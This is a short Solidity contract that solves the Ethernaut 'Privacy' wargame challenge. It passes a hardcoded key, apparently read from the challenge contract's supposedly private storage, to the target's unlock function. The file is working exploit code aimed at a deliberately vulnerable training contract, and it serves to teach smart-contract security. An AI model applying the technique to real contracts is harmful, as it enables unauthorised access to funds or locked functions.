// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Privacy {
    function unlock(bytes16) external;
}

// attacking ethernaut's initial privacy challenge
// just replay the same strategy to create the key, using Solidity

contract attackPrivacy {
    Privacy privacy;
    bytes32 key = 0xf6f3b19b49b2b8e38b1bdb477f6350cc3670b1d497a3f3ae0ea708d18b1c80eb;

    constructor(address _victim) {
        privacy = Privacy(_victim);
    }

    function unlock() external {
        privacy.unlock(bytes16(key));
    }

}